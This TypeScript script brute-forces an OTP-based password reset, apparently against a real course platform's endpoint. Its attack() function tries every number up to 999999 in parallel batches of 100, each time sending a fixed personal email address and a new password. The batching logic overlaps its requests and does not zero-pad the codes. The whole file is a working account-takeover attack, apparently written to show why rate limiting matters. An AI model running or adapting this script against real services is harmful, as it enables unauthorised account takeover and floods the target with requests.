import axios from "axios";

async function sendRequest(otp: string) {
  const data = JSON.stringify({
    email: "sagnik321@gmail.com",
    otp: otp,
    newPass: "sad",
  });

  const config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://harkirat.classx.co.in/new-courses",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios
    .request(config)
    .then((resp) => {
      console.log(JSON.stringify(resp.data));
    })
    .catch((err) => {
      console.log(err);
    });
}

//batching 
async function attack() {
  for (let i = 0; i <= 999999; i++) {
    // console.log(i);
    // sendRequest(i.toString());
    //batching operations
    const p = [];
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    console.log(p);
    //using promise.all to send in batches
    await Promise.all(p);
  }
}

attack();
